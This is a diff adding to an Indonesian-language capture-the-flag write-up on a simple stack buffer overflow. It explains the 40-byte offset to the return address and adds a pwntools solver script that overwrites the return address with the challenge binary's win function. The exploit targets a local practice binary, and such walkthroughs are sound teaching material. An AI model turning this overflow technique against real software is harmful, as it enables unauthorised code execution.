@@ -29,6 +29,21 @@ kita coba analisis fungsi vuln nya
 set rsp nya 0x20 atau 32 + save rbp 8 byte = 40, kita bisa menimpa buffer untuk menuju return address dan mengubah return tersebut menjadi return ke win.
 kalau masih kurang yakin kita bisa menggunakan gdb untuk mencari letak offset
 karena buffer nya 32 maka 32+8 byte rbp yaitu 40 atau bisa kalian crashing programnya dan mencari offset rsp
+caranya sudah banyak di internet kalau masih kurang paham.
 
 ![Preview](images/4.png)
 
+sekarang kita buat solvernya 
+**solver**
+```
+from pwn import *
+
+elf = context.binary = ELF('./chall')
+
+p = process()
+
+payload = flat(b'a'*40,elf.sym.win)
+
+p.sendline(payload)
+p.interactive()
+```
